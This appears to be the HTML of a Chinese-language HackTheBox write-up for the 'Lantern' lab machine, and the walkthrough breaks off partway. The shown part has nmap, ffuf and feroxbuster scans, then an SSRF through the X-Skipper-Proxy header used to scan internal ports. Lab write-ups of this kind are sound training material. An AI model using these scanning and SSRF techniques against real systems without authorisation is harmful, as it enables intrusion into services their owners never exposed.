@@ -1,0 +1,404 @@
+<!DOCTYPE html><html lang="zh-CN" data-astro-cid-sgg5joot><head><!-- Global Metadata --><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="icon" type="image/png" href="/favicon.png"><link rel="icon" href="/favicon.ico" sizes="any"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="sitemap" href="/sitemap-index.xml"><link rel="alternate" type="application/rss+xml" title="Zumpyx Blog" href="https://blog.zumpyx.com/rss.xml"><meta name="generator" content="Astro v7.1.0"><meta name="color-scheme" content="light dark"><meta name="theme-color" content="#0b0d11" media="(prefers-color-scheme: dark)"><meta name="theme-color" content="#f4f5f7" media="(prefers-color-scheme: light)"><script>
+	(() => {
+		try {
+			const t = localStorage.getItem('theme');
+			if (t === 'light' || t === 'dark') document.documentElement.setAttribute('data-theme', t);
+			else document.documentElement.removeAttribute('data-theme');
+		} catch {}
+	})();
+</script><style>@font-face{font-family:Atkinson-c7f4c4e8b285552f;src:url("/_astro/fonts/89758defcfa85239.woff") format("woff");font-display:swap;font-weight:400;font-style:normal;}@font-face{font-family:Atkinson-c7f4c4e8b285552f;src:url("/_astro/fonts/14aa8dd5744dd4bc.woff") format("woff");font-display:swap;font-weight:700;font-style:normal;}@font-face{font-family:"Atkinson-c7f4c4e8b285552f fallback: Arial";src:local("Arial");font-display:swap;font-weight:400;font-style:normal;size-adjust:99.3717%;ascent-override:80.1033%;descent-override:25.2587%;line-gap-override:0%;}@font-face{font-family:"Atkinson-c7f4c4e8b285552f fallback: Arial Bold";src:local("Arial Bold");font-display:swap;font-weight:700;font-style:normal;size-adjust:92.2954%;ascent-override:86.2448%;descent-override:27.1953%;line-gap-override:0%;}:root{--font-atkinson:Atkinson-c7f4c4e8b285552f,"Atkinson-c7f4c4e8b285552f fallback: Arial","Atkinson-c7f4c4e8b285552f fallback: Arial Bold",sans-serif;}</style><link rel="preload" href="/_astro/fonts/89758defcfa85239.woff" as="font" type="font/woff" crossorigin><link rel="preload" href="/_astro/fonts/14aa8dd5744dd4bc.woff" as="font" type="font/woff" crossorigin><!-- Canonical URL --><link rel="canonical" href="https://blog.zumpyx.com/hackthebox/machines/0621-lantern/"><!-- Primary Meta Tags --><title>Lantern · Zumpyx Blog</title><meta name="description" content="Lantern is a Hard Linux machine that showcases a misconfiguration in the **Skipper Proxy** and a **Blazor-based** web application. To successfully complete this challenge, an attacker must first exploit a [Server-Side Request Forgery](https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/) (**SSRF**) vulnerability to pivot into an internal service running locally. This will allow them to read files and upload new ones where the ultimate goal is to obtain a keypair that can be used to gain SSH access to the system. Privilege escalation is achieved by leveraging the misuse of the `procmon` utility, which allows for monitoring sensitive syscalls.  To succeed in this challenge, they player must conduct careful reconnaissance, exploit .NET binaries, and leverage privilege escalation techniques."><!-- Open Graph / Facebook --><meta property="og:type" content="website"><meta property="og:url" content="https://blog.zumpyx.com/hackthebox/machines/0621-lantern/"><meta property="og:title" content="Lantern · Zumpyx Blog"><meta property="og:description" content="Lantern is a Hard Linux machine that showcases a misconfiguration in the **Skipper Proxy** and a **Blazor-based** web application. To successfully complete this challenge, an attacker must first exploit a [Server-Side Request Forgery](https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/) (**SSRF**) vulnerability to pivot into an internal service running locally. This will allow them to read files and upload new ones where the ultimate goal is to obtain a keypair that can be used to gain SSH access to the system. Privilege escalation is achieved by leveraging the misuse of the `procmon` utility, which allows for monitoring sensitive syscalls.  To succeed in this challenge, they player must conduct careful reconnaissance, exploit .NET binaries, and leverage privilege escalation techniques."><meta property="og:image" content="https://blog.zumpyx.com/_astro/head.CE6FOIKY.png"><!-- Twitter --><meta name="twitter:card" content="summary_large_image"><meta name="twitter:url" content="https://blog.zumpyx.com/hackthebox/machines/0621-lantern/"><meta name="twitter:title" content="Lantern · Zumpyx Blog"><meta name="twitter:description" content="Lantern is a Hard Linux machine that showcases a misconfiguration in the **Skipper Proxy** and a **Blazor-based** web application. To successfully complete this challenge, an attacker must first exploit a [Server-Side Request Forgery](https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/) (**SSRF**) vulnerability to pivot into an internal service running locally. This will allow them to read files and upload new ones where the ultimate goal is to obtain a keypair that can be used to gain SSH access to the system. Privilege escalation is achieved by leveraging the misuse of the `procmon` utility, which allows for monitoring sensitive syscalls.  To succeed in this challenge, they player must conduct careful reconnaissance, exploit .NET binaries, and leverage privilege escalation techniques."><meta name="twitter:image" content="https://blog.zumpyx.com/_astro/head.CE6FOIKY.png"><link rel="stylesheet" href="/_astro/Header.BMe4uPxC.css"><style>.machine-list[data-astro-cid-twh6cqtg]{border:1px solid var(--border);border-radius:var(--radius);background:var(--bg-elevated);box-shadow:var(--shadow);margin-bottom:2rem;padding:1rem 1.15rem}.machine-list[data-astro-cid-twh6cqtg] h2[data-astro-cid-twh6cqtg]{font-size:1.1rem;font-family:var(--font-mono);color:var(--accent);margin:0 0 .65rem}.machine-list[data-astro-cid-twh6cqtg] ul[data-astro-cid-twh6cqtg]{margin:0;padding-left:1.2rem}.machine-list[data-astro-cid-twh6cqtg] li[data-astro-cid-twh6cqtg]{margin:.35rem 0}.machine-ref[data-astro-cid-twh6cqtg]{color:var(--text-bright);align-items:center;gap:.5rem;text-decoration:none;display:inline-flex}.machine-ref[data-astro-cid-twh6cqtg]:hover{color:var(--accent)}.machine-ref[data-astro-cid-twh6cqtg] img[data-astro-cid-twh6cqtg]{object-fit:cover;border:1px solid var(--border);border-radius:6px}.missing[data-astro-cid-twh6cqtg]{color:var(--text-muted);font-family:var(--font-mono);font-size:.9em}.diff[data-astro-cid-twh6cqtg]{color:var(--text-muted);font-size:.9em}.diff[data-astro-cid-twh6cqtg].very-easy{color:var(--very-easy)}.diff[data-astro-cid-twh6cqtg].easy{color:var(--easy)}.diff[data-astro-cid-twh6cqtg].medium{color:var(--medium)}.diff[data-astro-cid-twh6cqtg].hard{color:var(--hard)}.diff[data-astro-cid-twh6cqtg].insane{color:var(--insane)}
+main[data-astro-cid-sgg5joot]{width:calc(100% - 2em);max-width:100%;margin:0}.hero-image[data-astro-cid-sgg5joot]{width:100%}.hero-image[data-astro-cid-sgg5joot] img[data-astro-cid-sgg5joot]{border-radius:var(--radius);border:1px solid var(--border);box-shadow:var(--shadow);margin:0 auto;display:block}.prose[data-astro-cid-sgg5joot]{width:720px;max-width:calc(100% - 2em);color:var(--text);margin:auto;padding:1em}.prose[data-astro-cid-sgg5joot] img{border-radius:var(--radius-sm);border:1px solid var(--border);max-width:100%;height:auto}.prose[data-astro-cid-sgg5joot] a{color:var(--link)}.title[data-astro-cid-sgg5joot]{text-align:center;margin-bottom:1.25em;padding:1.25em 0 .5em;line-height:1.2}.title-row[data-astro-cid-sgg5joot]{justify-content:center;align-items:center;gap:.85rem;margin:0 0 .5em;display:flex}.title-row[data-astro-cid-sgg5joot] .avatar[data-astro-cid-sgg5joot],.title-row[data-astro-cid-sgg5joot] img{border-radius:var(--radius-sm);object-fit:contain;border:1px solid var(--border);width:52px;height:52px;box-shadow:0 0 20px var(--accent-glow);background:0 0;flex:none}.title[data-astro-cid-sgg5joot] h1[data-astro-cid-sgg5joot]{margin:0;font-size:clamp(1.75rem,4vw,2.5rem)}.date[data-astro-cid-sgg5joot]{color:var(--text-muted);font-family:var(--font-mono);letter-spacing:.04em;margin-bottom:.65em;font-size:.85rem}.last-updated-on[data-astro-cid-sgg5joot]{opacity:.85;margin-top:.25em;font-style:normal}.meta[data-astro-cid-sgg5joot]{flex-wrap:wrap;justify-content:center;gap:.45em;margin:.85em 0 0;display:flex}.meta[data-astro-cid-sgg5joot] .badge{font-size:.72rem;font-weight:600;font-family:var(--font-mono);letter-spacing:.06em;color:var(--text);border:1px solid var(--border);text-transform:uppercase;background:#ffffff08;border-radius:999px;align-items:center;gap:.35em;padding:.35em .75em;display:inline-flex;box-shadow:inset 0 1px #ffffff08}.meta[data-astro-cid-sgg5joot] .badge.difficulty-very-easy{color:var(--very-easy);background:#9ef01a1a;border-color:#9ef01a52}.meta[data-astro-cid-sgg5joot] .badge.difficulty-easy{color:var(--easy);background:#9fef001f;border-color:#9fef0059}.meta[data-astro-cid-sgg5joot] .badge.difficulty-medium{color:var(--medium);background:#ffcc001f;border-color:#ffcc0059}.meta[data-astro-cid-sgg5joot] .badge.difficulty-hard{color:var(--hard);background:#ff88001f;border-color:#f806}.meta[data-astro-cid-sgg5joot] .badge.difficulty-insane{color:var(--insane);background:#ff3e3e1f;border-color:#ff3e3e66}.links[data-astro-cid-sgg5joot]{font-size:.9rem;font-family:var(--font-mono);flex-wrap:wrap;justify-content:center;gap:1em;margin-top:.9em;display:flex}.links[data-astro-cid-sgg5joot] a{color:var(--accent);text-decoration:none}.links[data-astro-cid-sgg5joot] a:hover{text-underline-offset:.2em;text-decoration:underline}
+.nav-link[data-astro-cid-evkijfd6]{color:var(--text-muted);font-family:var(--font-mono);letter-spacing:.04em;text-transform:uppercase;white-space:nowrap;border:1px solid #0000;border-radius:999px;justify-content:center;align-items:center;padding:.5em .95em;font-size:.78rem;font-weight:500;text-decoration:none;transition:color .18s,background .18s,border-color .18s,box-shadow .18s;display:inline-flex}.nav-link[data-astro-cid-evkijfd6]:hover{color:var(--text-bright);background:var(--surface-hover);text-decoration:none}.nav-link[data-astro-cid-evkijfd6].active{color:var(--on-accent);background:linear-gradient(135deg, var(--accent-hover), var(--accent));box-shadow:0 0 0 1px var(--border-strong), 0 6px 16px var(--accent-glow-strong);text-shadow:none;border-color:#0000;font-weight:700;text-decoration:none}
+</style><script type="module" src="/_astro/page.CTxKKjGj.js"></script></head><body data-astro-cid-sgg5joot><div class="scanline" aria-hidden="true" data-astro-cid-sgg5joot></div><header data-astro-cid-nen7h5rs><div class="bar" data-astro-cid-nen7h5rs><a class="brand" href="/" data-astro-cid-nen7h5rs><span class="logo" aria-hidden="true" data-astro-cid-nen7h5rs><img src="/_astro/head.CE6FOIKY_1SW1hc.webp" srcset="/_astro/head.CE6FOIKY_1SW1hc.webp 1x, /_astro/head.CE6FOIKY_scYzG.webp 2x" alt data-astro-cid-nen7h5rs="true" loading="lazy" decoding="async" width="64" height="64" class="logo-img"></span><span class="brand-text" data-astro-cid-nen7h5rs><span class="prompt" aria-hidden="true" data-astro-cid-nen7h5rs>~/</span><span class="brand-name" data-astro-cid-nen7h5rs>Zumpyx Blog</span></span></a><nav class="nav-pill" aria-label="Primary" data-astro-cid-nen7h5rs><div class="nav-track" data-astro-cid-nen7h5rs><a href="/" class="nav-link" data-astro-cid-nen7h5rs="true" data-astro-cid-evkijfd6>Home</a><a href="/blog" class="nav-link" data-astro-cid-nen7h5rs="true" data-astro-cid-evkijfd6>Blog</a><a href="/hackthebox" class="nav-link active" data-astro-cid-nen7h5rs="true" data-astro-cid-evkijfd6>HackTheBox</a><a href="/projects" class="nav-link" data-astro-cid-nen7h5rs="true" data-astro-cid-evkijfd6>Projects</a><a href="/about" class="nav-link" data-astro-cid-nen7h5rs="true" data-astro-cid-evkijfd6>About</a></div></nav><div class="actions" data-astro-cid-nen7h5rs><button type="button" class="icon-btn search-trigger" data-search-open aria-label="搜索" title="搜索 (Ctrl/⌘+K)" data-astro-cid-7yy3665x><svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" aria-hidden="true" data-astro-cid-7yy3665x><circle cx="11" cy="11" r="6.5" data-astro-cid-7yy3665x></circle><path d="M16.5 16.5 21 21" stroke-linecap="round" data-astro-cid-7yy3665x></path></svg></button><div class="search-root" data-search-root hidden data-astro-cid-7yy3665x><div class="search-backdrop" data-search-close data-astro-cid-7yy3665x></div><div class="search-panel" role="dialog" aria-modal="true" aria-label="全站搜索" data-astro-cid-7yy3665x><div class="search-bar" data-astro-cid-7yy3665x><svg class="search-ico" viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" aria-hidden="true" data-astro-cid-7yy3665x><circle cx="11" cy="11" r="6.5" data-astro-cid-7yy3665x></circle><path d="M16.5 16.5 21 21" stroke-linecap="round" data-astro-cid-7yy3665x></path></svg><input type="search" class="search-input" data-search-input placeholder="全文搜索：标题 / 正文 / 标签…" autocomplete="off" autocapitalize="off" spellcheck="false" enterkeyhint="search" data-astro-cid-7yy3665x><kbd class="search-kbd" data-search-close-hint data-astro-cid-7yy3665x>Esc</kbd></div><div class="search-meta" data-search-meta data-astro-cid-7yy3665x>输入关键词开始搜索</div><ul class="search-results" data-search-results role="listbox" aria-label="搜索结果" data-astro-cid-7yy3665x></ul></div></div><script type="module" src="/_astro/SiteSearch.astro_astro_type_script_index_0_lang.CiT4pk6n.js"></script><button type="button" class="icon-btn theme-toggle" data-theme-toggle aria-label="主题：跟随系统" title="主题：跟随系统（点击切换）" data-astro-cid-l6lhmie6><span class="icon icon-system" aria-hidden="true" data-astro-cid-l6lhmie6><!-- auto / system --><svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" data-astro-cid-l6lhmie6><rect x="3" y="4" width="18" height="12" rx="2" data-astro-cid-l6lhmie6></rect><path d="M8 20h8M12 16v4" data-astro-cid-l6lhmie6></path></svg></span><span class="icon icon-light" aria-hidden="true" hidden data-astro-cid-l6lhmie6><svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" data-astro-cid-l6lhmie6><circle cx="12" cy="12" r="4" data-astro-cid-l6lhmie6></circle><path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M4.93 19.07l1.41-1.41M17.66 6.34l1.41-1.41" data-astro-cid-l6lhmie6></path></svg></span><span class="icon icon-dark" aria-hidden="true" hidden data-astro-cid-l6lhmie6><svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" data-astro-cid-l6lhmie6><path d="M21 14.5A8.5 8.5 0 1 1 9.5 3a7 7 0 0 0 11.5 11.5z" stroke-linejoin="round" data-astro-cid-l6lhmie6></path></svg></span></button><script>
+	(() => {
+		const KEY = 'theme';
+		const ORDER = ['system', 'light', 'dark'];
+		const LABELS = {
+			system: '主题：跟随系统',
+			light: '主题：亮色',
+			dark: '主题：暗色',
+		};
+
+		const getStored = () => {
+			try {
+				const v = localStorage.getItem(KEY);
+				if (v === 'light' || v === 'dark' || v === 'system') return v;
+			} catch {}
+			return 'system';
+		};
+
+		const apply = (mode) => {
+			const root = document.documentElement;
+			if (mode === 'light' || mode === 'dark') root.setAttribute('data-theme', mode);
+			else root.removeAttribute('data-theme');
+			try {
+				if (mode === 'system') localStorage.removeItem(KEY);
+				else localStorage.setItem(KEY, mode);
+			} catch {}
+		};
+
+		const syncButton = (mode) => {
+			document.querySelectorAll('[data-theme-toggle]').forEach((btn) => {
+				btn.setAttribute('data-mode', mode);
+				btn.setAttribute('aria-label', LABELS[mode]);
+				btn.setAttribute('title', `${LABELS[mode]}（点击切换）`);
+				btn.querySelectorAll('.icon').forEach((el) => {
+					el.hidden = true;
+				});
+				const icon = btn.querySelector(`.icon-${mode}`);
+				if (icon) icon.hidden = false;
+			});
+		};
+
+		const mode = getStored();
+		apply(mode);
+		syncButton(mode);
+
+		document.querySelectorAll('[data-theme-toggle]').forEach((btn) => {
+			btn.addEventListener('click', () => {
+				const cur = getStored();
+				const next = ORDER[(ORDER.indexOf(cur) + 1) % ORDER.length];
+				apply(next);
+				syncButton(next);
+			});
+		});
+
+		// If following system, react to OS changes
+		try {
+			const mq = window.matchMedia('(prefers-color-scheme: dark)');
+			mq.addEventListener?.('change', () => {
+				if (getStored() === 'system') apply('system');
+			});
+		} catch {}
+	})();
+</script><a class="icon-btn" href="/rss.xml" target="_blank" rel="noopener noreferrer" title="RSS" aria-label="RSS 订阅" data-astro-cid-nen7h5rs><svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" aria-hidden="true" data-astro-cid-nen7h5rs><path d="M5 19a1.5 1.5 0 1 0 0.01 0" fill="currentColor" stroke="none" data-astro-cid-nen7h5rs></path><path d="M4 11a9 9 0 0 1 9 9" stroke-linecap="round" data-astro-cid-nen7h5rs></path><path d="M4 5a15 15 0 0 1 15 15" stroke-linecap="round" data-astro-cid-nen7h5rs></path></svg></a></div></div></header><main data-astro-cid-sgg5joot><article data-astro-cid-sgg5joot><div class="prose" data-astro-cid-sgg5joot><div class="title" data-astro-cid-sgg5joot><div class="date" data-astro-cid-sgg5joot><time datetime="2024-08-17T00:00:00.000Z">2024-08-17</time></div><div class="title-row" data-astro-cid-sgg5joot><img src="/_astro/avatar.BS-zAWWG_1TWDEP.webp" alt data-astro-cid-sgg5joot="true" loading="lazy" decoding="async" width="48" height="48" class="avatar"><h1 data-astro-cid-sgg5joot>Lantern</h1></div><div class="meta" data-astro-cid-sgg5joot><span class="badge" data-astro-cid-twh6cqtg>Machines</span><span class="badge" data-astro-cid-twh6cqtg>#621</span><span class="badge difficulty-hard" data-astro-cid-twh6cqtg>Hard</span><span class="badge" data-astro-cid-twh6cqtg>Linux</span><span class="badge" data-astro-cid-twh6cqtg>lantern</span></div><div class="links" data-astro-cid-sgg5joot><a href="/hackthebox/machines/" data-astro-cid-twh6cqtg>← Machines</a></div><hr data-astro-cid-sgg5joot></div><h2 id="enum--recon">Enum &amp; Recon</h2>
+<h3 id="port-scan">Port Scan</h3>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>nmap -p- --min-rate 1000 -T4 -sC -sV -O -oA log/nmap -v [ip]</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>PORT     STATE SERVICE VERSION</span></span>
+<span class="line"><span>22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)</span></span>
+<span class="line"><span>| ssh-hostkey: </span></span>
+<span class="line"><span>|   256 80:c9:47:d5:89:f8:50:83:02:5e:fe:53:30:ac:2d:0e (ECDSA)</span></span>
+<span class="line"><span>|_  256 d4:22:cf:fe:b1:00:cb:eb:6d:dc:b2:b4:64:6b:9d:89 (ED25519)</span></span>
+<span class="line"><span>80/tcp   open  http    Skipper Proxy</span></span>
+<span class="line"><span>| http-methods: </span></span>
+<span class="line"><span>|_  Supported Methods: HEAD GET OPTIONS</span></span>
+<span class="line"><span>|_http-title: Did not follow redirect to http://lantern.htb/</span></span>
+<span class="line"><span>|_http-server-header: Skipper Proxy</span></span>
+<span class="line"><span>| fingerprint-strings: </span></span>
+<span class="line"><span>|   FourOhFourRequest: </span></span>
+<span class="line"><span>|     HTTP/1.0 404 Not Found</span></span>
+<span class="line"><span>|     Content-Length: 207</span></span>
+<span class="line"><span>|     Content-Type: text/html; charset=utf-8</span></span>
+<span class="line"><span>|     Date: Tue, 12 Nov 2024 00:10:37 GMT</span></span>
+<span class="line"><span>|     Server: Skipper Proxy</span></span>
+<span class="line"><span>|     &lt;!doctype html&gt;</span></span>
+<span class="line"><span>|     &lt;html lang=en&gt;</span></span>
+<span class="line"><span>|     &lt;title&gt;404 Not Found&lt;/title&gt;</span></span>
+<span class="line"><span>|     &lt;h1&gt;Not Found&lt;/h1&gt;</span></span>
+<span class="line"><span>|     &lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;</span></span>
+<span class="line"><span>|   GenericLines, Help, RTSPRequest, SSLSessionReq, TerminalServerCookie: </span></span>
+<span class="line"><span>|     HTTP/1.1 400 Bad Request</span></span>
+<span class="line"><span>|     Content-Type: text/plain; charset=utf-8</span></span>
+<span class="line"><span>|     Connection: close</span></span>
+<span class="line"><span>|     Request</span></span>
+<span class="line"><span>|   GetRequest: </span></span>
+<span class="line"><span>|     HTTP/1.0 302 Found</span></span>
+<span class="line"><span>|     Content-Length: 225</span></span>
+<span class="line"><span>|     Content-Type: text/html; charset=utf-8</span></span>
+<span class="line"><span>|     Date: Tue, 12 Nov 2024 00:10:31 GMT</span></span>
+<span class="line"><span>|     Location: http://lantern.htb/</span></span>
+<span class="line"><span>|     Server: Skipper Proxy</span></span>
+<span class="line"><span>|     &lt;!doctype html&gt;</span></span>
+<span class="line"><span>|     &lt;html lang=en&gt;</span></span>
+<span class="line"><span>|     &lt;title&gt;Redirecting...&lt;/title&gt;</span></span>
+<span class="line"><span>|     &lt;h1&gt;Redirecting...&lt;/h1&gt;</span></span>
+<span class="line"><span>|     &lt;p&gt;You should be redirected automatically to the target URL: &lt;a href="http://lantern.htb/"&gt;http://lantern.htb/&lt;/a&gt;. If not, click the link.</span></span>
+<span class="line"><span>|   HTTPOptions: </span></span>
+<span class="line"><span>|     HTTP/1.0 200 OK</span></span>
+<span class="line"><span>|     Allow: HEAD, GET, OPTIONS</span></span>
+<span class="line"><span>|     Content-Length: 0</span></span>
+<span class="line"><span>|     Content-Type: text/html; charset=utf-8</span></span>
+<span class="line"><span>|     Date: Tue, 12 Nov 2024 00:10:31 GMT</span></span>
+<span class="line"><span>|_    Server: Skipper Proxy</span></span>
+<span class="line"><span>3000/tcp open  ppp?</span></span>
+<span class="line"><span>| fingerprint-strings: </span></span>
+<span class="line"><span>|   GetRequest: </span></span>
+<span class="line"><span>|     HTTP/1.1 500 Internal Server Error</span></span>
+<span class="line"><span>|     Connection: close</span></span>
+<span class="line"><span>|     Content-Type: text/plain; charset=utf-8</span></span>
+<span class="line"><span>|     Date: Tue, 12 Nov 2024 00:10:36 GMT</span></span>
+<span class="line"><span>|     Server: Kestrel</span></span>
+<span class="line"><span>|     System.UriFormatException: Invalid URI: The hostname could not be parsed.</span></span>
+<span class="line"><span>|     System.Uri.CreateThis(String uri, Boolean dontEscape, UriKind uriKind, UriCreationOptions&amp; creationOptions)</span></span>
+<span class="line"><span>|     System.Uri..ctor(String uriString, UriKind uriKind)</span></span>
+<span class="line"><span>|     Microsoft.AspNetCore.Components.NavigationManager.set_BaseUri(String value)</span></span>
+<span class="line"><span>|     Microsoft.AspNetCore.Components.NavigationManager.Initialize(String baseUri, String uri)</span></span>
+<span class="line"><span>|     Microsoft.AspNetCore.Components.Server.Circuits.RemoteNavigationManager.Initialize(String baseUri, String uri)</span></span>
+<span class="line"><span>|     Microsoft.AspNetCore.Mvc.ViewFeatures.StaticComponentRenderer.&lt;InitializeStandardComponentServicesAsync&gt;g__InitializeCore|5_0(HttpContext httpContext)</span></span>
+<span class="line"><span>|     Microsoft.AspNetCore.Mvc.ViewFeatures.StaticC</span></span>
+<span class="line"><span>|   HTTPOptions: </span></span>
+<span class="line"><span>|     HTTP/1.1 200 OK</span></span>
+<span class="line"><span>|     Content-Length: 0</span></span>
+<span class="line"><span>|     Connection: close</span></span>
+<span class="line"><span>|     Date: Tue, 12 Nov 2024 00:10:42 GMT</span></span>
+<span class="line"><span>|     Server: Kestrel</span></span>
+<span class="line"><span>|   Help: </span></span>
+<span class="line"><span>|     HTTP/1.1 400 Bad Request</span></span>
+<span class="line"><span>|     Content-Length: 0</span></span>
+<span class="line"><span>|     Connection: close</span></span>
+<span class="line"><span>|     Date: Tue, 12 Nov 2024 00:10:36 GMT</span></span>
+<span class="line"><span>|     Server: Kestrel</span></span>
+<span class="line"><span>|   RTSPRequest: </span></span>
+<span class="line"><span>|     HTTP/1.1 505 HTTP Version Not Supported</span></span>
+<span class="line"><span>|     Content-Length: 0</span></span>
+<span class="line"><span>|     Connection: close</span></span>
+<span class="line"><span>|     Date: Tue, 12 Nov 2024 00:10:42 GMT</span></span>
+<span class="line"><span>|     Server: Kestrel</span></span>
+<span class="line"><span>|   SSLSessionReq, TerminalServerCookie: </span></span>
+<span class="line"><span>|     HTTP/1.1 400 Bad Request</span></span>
+<span class="line"><span>|     Content-Length: 0</span></span>
+<span class="line"><span>|     Connection: close</span></span>
+<span class="line"><span>|     Date: Tue, 12 Nov 2024 00:10:58 GMT</span></span>
+<span class="line"><span>|_    Server: Kestrel</span></span></code></pre>
+<h3 id="vhost-scan">VHost Scan</h3>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>ffuf -u http://lantern.htb/ -H "Host: FUZZ.lantern.htb" -w /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt -fc 302 -o logs/vhost.log</span></span></code></pre>
+<p><img alt="image-20241112160430044.png" loading="lazy" decoding="async" width="1157" height="462" src="/_astro/image-20241112160430044.Te4jHu6L_Z1bonrG.webp" srcset=""></p>
+<h2 id="shell-as-tomas">Shell as Tomas</h2>
+<p><img alt="image-20241112083908416.png" loading="lazy" decoding="async" width="1190" height="369" src="/_astro/image-20241112083908416.C_paFGEa_RHXWA.webp" srcset=""></p>
+<p>查看 80 端口，一个普通的主页，在下面发现三个名称，先作为用户名保存起来</p>
+<ul>
+<li>扫描目录</li>
+</ul>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>feroxbuster --no-state -u http://lantern.htb/ -o logs/feroxbuster_lantern_htb.log</span></span></code></pre>
+<p><img alt="image-20241112160559333.png" loading="lazy" decoding="async" width="1089" height="649" src="/_astro/image-20241112160559333.DLFsmOLf_214MaB.webp" srcset=""></p>
+<p>没发现什么有用的目录，回看 Nmap 日志，或者查看数据包</p>
+<p><img alt="image-20241112092408097.png" loading="lazy" decoding="async" width="885" height="473" src="/_astro/image-20241112092408097.C9OmXNVx_2MAxW.webp" srcset=""></p>
+<p>发现使用的 HTTP 服务器是 Skipper Proxy，并且找到一个 SSRF 漏洞</p>
+<p><img alt="image-20241112092533564.png" loading="lazy" decoding="async" width="721" height="323" src="/_astro/image-20241112092533564.DJZnxHBK_9iDuQ.webp" srcset=""></p>
+<p><img alt="image-20241112093135450.png" loading="lazy" decoding="async" width="1023" height="279" src="/_astro/image-20241112093135450.DlFaRH65_ZJqmgd.webp" srcset=""></p>
+<p>构造请求包</p>
+<p><img alt="image-20241112093307723.png" loading="lazy" decoding="async" width="601" height="258" src="/_astro/image-20241112093307723.DIMQDq6X_Z29cqU7.webp" srcset=""></p>
+<p><img alt="image-20241112093317166.png" loading="lazy" decoding="async" width="699" height="123" src="/_astro/image-20241112093317166.DetOOZNb_Zc4Oxu.webp" srcset=""></p>
+<p>可以看到是存在漏洞的，那么可以利用此漏洞进行端口扫描</p>
+<p><img alt="image-20241112093423418.png" loading="lazy" decoding="async" width="1236" height="1104" src="/_astro/image-20241112093423418.WJwOEgCn_Z1lBOWH.webp" srcset=""></p>
+<p>首先对 nmap 发现的 3000 端口进行尝试，发现响应中有一部分类似 Base64 的数据</p>
+<p><img alt="image-20241112093844040.png" loading="lazy" decoding="async" width="1216" height="603" src="/_astro/image-20241112093844040.gThS-AuK_o9Xtx.webp" srcset=""></p>
+<p>看到其中有 <code>\u002B</code>，替换成 + 号再次尝试</p>
+<p><img alt="image-20241112100318740.png" loading="lazy" decoding="async" width="623" height="299" src="/_astro/image-20241112100318740.BTBkRjX9_ZfauKT.webp" srcset=""></p>
+<p>Base64 解码失败，识别发现很可能是某种加密，暂且搁置，先扫描一下看看是否有其他端口。</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>ffuf -u http://lantern.htb/ -H "X-Skipper-Proxy: http://127.0.0.1:FUZZ" -w res/top1000.port -mc 200</span></span></code></pre>
+<p><img alt="image-20241112100933430.png" loading="lazy" decoding="async" width="847" height="486" src="/_astro/image-20241112100933430.DsYdlUBo_ZwIFjJ.webp" srcset=""></p>
+<p>发现 5000、8000 端口</p>
+<p><img alt="image-20241112101049847.png" loading="lazy" decoding="async" width="1220" height="971" src="/_astro/image-20241112101049847.DKhsEbXQ_Z1SIzs.webp" srcset=""></p>
+<p>其中 5000 端口的响应，像是一个跳转页面，使用浏览器打开</p>
+<p><img alt="image-20241112101214046.png" loading="lazy" decoding="async" width="584" height="177" src="/_astro/image-20241112101214046.Be_61U2Z_Z2kmlWU.webp" srcset=""></p>
+<p>还是加载错误</p>
+<p><img alt="image-20241112101345973.png" loading="lazy" decoding="async" width="1130" height="704" src="/_astro/image-20241112101345973.BvNU_UY1_2vvBCJ.webp" srcset=""></p>
+<p>再看 8000 端口和 80 端口内容一样，那就侧重一下 5000 端口</p>
+<p><img alt="image-20241112101754219.png" loading="lazy" decoding="async" width="889" height="419" src="/_astro/image-20241112101754219.BdHK6k7a_Z195APS.webp" srcset=""></p>
+<p>结合搜索引擎，发现一个眼熟的服务，但是 3000 端口的字符串是 blazor，由于不太了解，只能再次搜索</p>
+<p><img alt="image-20241112101853113.png" loading="lazy" decoding="async" width="670" height="489" src="/_astro/image-20241112101853113.BcCnUSck_9dVce.webp" srcset=""></p>
+<p>看来确实是有关系的，那么可以搜索一下这个 blazor 框架的相关路径</p>
+<p><img alt="image-20241112102828099.png" loading="lazy" decoding="async" width="765" height="90" src="/_astro/image-20241112102828099.CN049b7a_1ol9Yu.webp" srcset=""></p>
+<p>从字典中找到两个路径，尝试访问一下</p>
